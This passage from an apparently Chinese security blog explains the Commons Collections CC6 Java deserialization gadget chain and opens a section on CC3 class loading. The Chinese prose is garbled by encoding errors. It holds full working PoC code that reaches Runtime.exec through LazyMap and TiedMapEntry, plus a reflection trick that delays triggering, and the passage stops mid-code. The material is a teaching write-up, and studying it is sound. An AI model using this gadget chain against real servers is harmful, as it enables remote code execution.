title="CC6"></a>CC6</h1><h2 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç”±äºåœ¨java8u71å¤§ç‰ˆæœ¬ä¸­AnnotationInvocationHandler.readObjectè¢«ä¿®æ”¹äº†ï¼Œæ²¡æœ‰ä¸Šè¿°CC1çš„è°ƒç”¨é“¾,å› æ­¤å‡ºç°äº†CC6, äº‹å®ä¸ŠCC6æ˜¯CC1çš„å˜ç§, å®ƒæ²¡æœ‰ç‰ˆæœ¬é™åˆ¶, è¿™é‡Œæˆ‘ä»¬ä¾æ—§æ²¿ç”¨CC1çš„ç¯å¢ƒ</p><h2 id="é“¾å­åˆ†æ-1"><a href="#é“¾å­åˆ†æ-1" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>åœ¨æ­¤ä¹‹å‰, è®©æˆ‘ä»¬å…ˆæ¥å›å¿†ä¸€ä¸‹CC1çš„è°ƒç”¨é“¾</p><ol><li><p>é¦–å…ˆ å…¥å£ä¸ºAnnotationInvocationHandlerçš„readObject, readObjectä¸‹æœ‰ä¸€ä¸ªsetValueæ–¹æ³•,æ­¤æ—¶setValueå‚æ•°ä¸å¯æ§</p></li><li><p>é€šè¿‡åŒåæ–¹æ³•, è·³è½¬åˆ°TransformedMapä¸‹çš„setValueæ–¹æ³•(æ­¤æ–¹æ³•ç»§æ‰¿è‡ªAbstractInputCheckedMapDecorator), åˆè°ƒç”¨TransformedMapä¸‹çš„CheckValueæ–¹æ³•, CheckValueä¸­è°ƒç”¨äº†å¯æ§å‚æ•°çš„transformæ–¹æ³•</p></li><li><p>é€šè¿‡transformåŒåæ–¹æ³•, è·³è½¬åˆ°ChainedTransformerä¸‹çš„transform, æ­¤æ–¹æ³•é€’å½’è°ƒç”¨äº†ä¸€ä¸ªå¯æ§æ•°ç»„çš„transformæ–¹æ³•,å½¢æˆä¸€ä¸ªè°ƒç”¨é“¾, é€šè¿‡å°†å¯æ§æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ èµ‹å€¼ä¸ºConstantTransformer, è°ƒç”¨ConstantTransformerçš„transformè¿”å›ä¸€ä¸ªRuntime,Classä½œä¸ºä¸‹ä¸€æ¬¡transformè°ƒç”¨çš„å‚æ•°, ç»•è¿‡æ­¥éª¤1ä¸­etValueå‚æ•°ä¸å¯æ§çš„é—®é¢˜, é€æ­¥é€šè¿‡InvokerTransformerè°ƒç”¨é“¾æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„è¡Œä¸º</p></li></ol><p>è¿™æ˜¯æˆ‘ä»¬ä¸Šé¢åˆ†æå‡ºçš„CC1</p><p>å†æ¥çœ‹ä¸‹ysoserialä¸Šçš„CC1é“¾å­</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240329211807221.png" alt="image-20240329211807221"></p><p>ä¸åŒä¹‹å¤„æ˜¯ysoserialç”¨çš„æ˜¯LazyMap.get, è€Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯TransformedMap.setValue()</p><p>å†æ¥çœ‹ysoserialä¸Šçš„CC6é“¾å­</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330121419699.png" alt="image-20240330121419699"></p><p>è¿™é‡ŒååŠæ®µé“¾å­å®é™…ä¸Šå’Œysoserialä¸­çš„CC1çš„ååŠæ®µé«˜åº¦ç›¸ä¼¼, ä¸åŒçš„æ˜¯CC1ä¸­è°ƒç”¨LazyMap.get()çš„æ˜¯AnnotationInvocationHandler, è€Œè¿™é‡Œæ˜¯TiedMapEntry</p><p>å…ˆæ¥çœ‹LazyMap, è¿™é‡Œä¹‹å‰æ²¡æœ‰åˆ†æè¿‡</p><p>ä¸TransformedMapç±»ä¼¼, å®ƒä¹Ÿæœ‰ä¸€ä¸ªdecorateæ–¹æ³•æ¥è¿”å›ä¸€ä¸ªLazyMapå¯¹è±¡, å¹¶ä¸”ä½¿å¾—getæ–¹æ³•ä¸­çš„å‚æ•°å¯æ§</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330201851832.png" alt="image-20240330201851832"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330201820196.png" alt="image-20240330201820196"></p><p>è½¬åˆ°TiedMapEntry, å¯ä»¥å‘ç°å®ƒè°ƒç”¨äº†å¯æ§å¯¹è±¡çš„getæ–¹æ³•, å¹¶ä¸”ä¼ ç»™getçš„å‚æ•°å¯æ§</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330190853630.png" alt="image-20240330190853630"></p><p>å†çœ‹è°è°ƒç”¨äº†getValue()             <em><strong>åç»­ä¸éœ€è¦è€ƒè™‘å‚æ•°, å› ä¸ºè¿™é‡Œçš„getValueå¹¶æ²¡æœ‰æ¥æ”¶ä»»ä½•å‚æ•°</strong></em></p><p>å¾€ä¸‹ç¿»å°±èƒ½çœ‹è§å°±èƒ½å‘ç°, hashCode()è°ƒç”¨äº†getValue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330191238122.png" alt="image-20240330191238122"></p><p>çœ‹è§hashCode,å°±å¯ä»¥æƒ³åˆ°å»HashMapé›†åˆä¸­å¯»æ‰¾å…¶è°ƒç”¨</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330192257619.png" alt="image-20240330192257619"></p><p>ç»§ç»­å¯»æ‰¾è°è°ƒç”¨äº†hash, ç­”æ¡ˆæ˜¯put (è¿™é‡Œé€‰ç”¨putæ˜¯ysoserialä¸­çš„é“¾å­, åé¢ä¼šæ›´æ”¹)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330195711124.png" alt="image-20240330195711124"></p><p>ä¹‹åæ˜¯HashSetä¸­çš„readObjectè°ƒç”¨äº†put</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330200217088.png" alt="image-20240330200217088"></p><p>ä»¥ä¸Šæ˜¯ysoserialä¸­çš„è°ƒç”¨é“¾, å®é™…ä¸Šæˆ‘ä»¬å¹¶ä¸éœ€è¦å»è°ƒç”¨HashSetä¸­çš„readObject, åœ¨URLDNSé“¾å­ä¸­, æˆ‘ä»¬è°ƒç”¨äº†hashMapä¸­çš„readObject, åœ¨readObjectçš„æœ€åè°ƒç”¨äº†hash</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330224651396.png" alt="image-20240330224651396"></p><p>è·Ÿè¿›, è°ƒç”¨hashCode</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330224957275.png" alt="image-20240330224957275"></p><p>ä¹‹åå°±æ˜¯æ„é€ è°ƒç”¨åˆ°TiedMapEntry</p><p>éœ€è¦æ³¨æ„çš„æ˜¯, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330232456683.png" alt="image-20240330232456683"></p><p>æƒ³è¦è¿›å…¥è¿™ä¸ªif, éœ€è¦ä½¿mapä¸­æ²¡æœ‰key, è¿™ä¸ªkeyæ˜¯TiedMapEntryçš„ç¬¬äºŒä¸ªå‚æ•°ä¼ è¿‡æ¥çš„, æˆ‘ä»¬ä¼ å…¥äº†ä¸€ä¸ªaaa, å› æ­¤æˆ‘ä»¬å¿…é¡»åœ¨putåå°†å®ƒremoveæ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       <span class="comment">// serialize(hashMap);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯æ˜¯è¿™é‡Œå³ä½¿ä¸è¿›è¡Œåºåˆ—åŒ–ååºåˆ—åŒ–ä¾æ—§ä¼šå¼¹å‡ºè®¡ç®—å™¨</p><p>é—®é¢˜å°±å‡ºåœ¨äº†hashmap.put</p><p>åœ¨æˆ‘ä»¬è¿˜æ²¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™è¿›è¡Œäº†putæ“ä½œ,å®ƒè°ƒç”¨hashæ–¹æ³•, å¹¶ä¸”ä¼ å…¥çš„å‚æ•°ä¹Ÿæ˜¯æˆ‘ä»¬çš„åˆ©ç”¨ä»£ç , è‡ªç„¶ä¼šå¼¹å‡ºè®¡ç®—å™¨, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330231133198.png" alt="image-20240330231133198"></p><p>å› æ­¤, æˆ‘ä»¬åº”è¯¥é¿å…ä»¥ä¸Šæƒ…å†µ, æˆ‘ä»¬å¯ä»¥å…ˆputä¸€ä¸ªæ— ç”¨çš„å€¼è¿›å», putç»“æŸåå†é€šè¿‡åå°„å°†å…¶æ”¹ä¸ºæˆ‘ä»¬çš„åˆ©ç”¨ä»£ç </p><p>è½¬åˆ°LazyMap, è¿™é‡Œçš„factory, ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥chainedTransformerçš„å‚æ•°, æˆ‘ä»¬å¯ä»¥åå°„æ›´æ”¹è¿™ä¸ªå¸¸é‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330231902285.png" alt="image-20240330231902285"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ, ç»“æŸ</p><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>CC3å°±å’ŒCC1ã€CC6ä¸åŒäº†ï¼Œåè€…æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œè€Œå‰è€…æ˜¯é€šè¿‡åŠ¨æ€åŠ è½½ç±»ï¼Œç„¶åå®ä¾‹åŒ–ç±»è¾¾åˆ°æ‰§è¡Œé™æ€ä»£ç å—çš„ç›®çš„</p><p>å› æ­¤æˆ‘ä»¬å…ˆæ¥å¤ä¹ ä¸€ä¸‹ç±»çš„åŠ¨æ€åŠ è½½å’ŒåŒäº²å§”æ´¾æœºåˆ¶</p><h2 id="ç±»çš„åŠ¨æ€åŠ è½½"><a href="#ç±»çš„åŠ¨æ€åŠ è½½" class="headerlink" title="ç±»çš„åŠ¨æ€åŠ è½½"></a>ç±»çš„åŠ¨æ€åŠ è½½</h2><p>åœ¨æ­¤ä¹‹å‰éœ€è¦ä»‹ç»2ä¸ªä»£ç å—ï¼Œ<strong>é™æ€ä»£ç å—å’Œæ„é€ ä»£ç å—</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    system.out.printIn(<span class="string">&quot;æ„é€ ä»£ç å—&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"> system.out.printIn(<span class="string">&quot;é™æ€ä»£ç å—&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç±»è¿›è¡Œ__åˆå§‹åŒ–__çš„æ—¶å€™, __é™æ€ä»£ç å—__ä¼šè¢«æ‰§è¡Œ</p><p>åœ¨ç±»è¿›è¡Œ__å®ä¾‹åŒ–__çš„æ—¶å€™ï¼Œ__æ„é€ ä»£ç å—å’Œæ„é€ å‡½æ•°å’Œé™æ€ä»£ç å—__ä¸€å¹¶æ‰§è¡Œ</p><p>ä¾‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ„é€ ä»£ç å—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é™æ€ä»£ç å—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ— å‚æ„é€ æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        System.out.println(word);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ è½½ç±»å¹¶é»˜è®¤è¿›è¡Œåˆå§‹åŒ–:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">          <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510222635510.png" alt="image-20240510222635510"></p><p>åŠ è½½ç±»ä½†ä¸åˆå§‹åŒ–:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> 